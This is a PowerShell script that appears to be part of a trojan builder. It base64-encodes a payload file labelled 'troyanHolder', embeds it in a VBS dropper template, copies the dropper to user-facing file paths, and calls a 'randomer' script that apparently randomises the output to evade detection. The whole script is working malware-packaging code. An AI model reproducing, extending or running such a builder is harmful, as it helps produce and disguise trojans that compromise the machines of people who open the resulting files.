param (
    [string]$serverName
)

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName



function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

function Decode-Base64StringToFile {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Convert-ArrayToQuotedString {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Array
    )

    # Process each element to enclose in double quotes and join with commas
    $quotedArray = $Array | ForEach-Object { "`"$_`"" }
    $joinedString = $quotedArray -join ","

    return $joinedString
}

Function Check-Array {
    param (
        [object]$InputObject
    )

    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
        return $true
    } else {
        return $false
    }
}

$body = Encode-FileToBase64 -inFile $server.troyanHolder

$holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")

$result = $holder
$result = $result -replace '0102', $body

$result | Set-Content $server.troyanVbsFile
Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFileClean -Force
& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.userVbsFile -outputFile $server.userVbsFile  -fileType vbs